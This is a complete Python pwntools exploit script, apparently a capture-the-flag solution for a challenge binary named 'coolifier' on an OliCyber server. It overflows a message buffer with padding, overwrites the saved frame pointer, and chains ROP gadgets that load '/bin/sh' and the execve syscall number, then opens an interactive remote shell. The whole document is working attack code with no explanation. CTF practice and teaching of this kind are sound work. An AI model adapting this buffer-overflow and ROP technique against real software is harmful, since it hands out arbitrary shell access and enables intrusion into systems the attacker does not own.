#!/usr/bin/env python3

from pwn import *

exe = ELF("./coolifier_patched")

context.binary = exe
context.terminal = ['kgx', '-e']

def conn():
    if args.GDB:
        r = gdb.debug(exe.path, '''
           b *main+255
           continue
        ''')
    else:
        r = remote("coolifier.challs.olicyber.it", 38068)

    return r


def main():
    r = conn()

    A, B, C, D, E = [exe.symbols[i] for i in ("a", "b", "c", "d", "e")]
    binsh = 0x4020BD

    rop = flat(
        b'iamabear!' * 15, # 255 bytes
        b'A' * 9, # last byte and RBP
        A, binsh - 8,
        B, 0,
        C, 0x37,
        D, 0x3b + 0x37,
        E
    )

    r.sendlineafter(b'length: ', str(len(rop)).encode())
    r.sendafter(b'Message: ', rop)

    r.interactive() # you got the shell


if __name__ == "__main__":
    main()
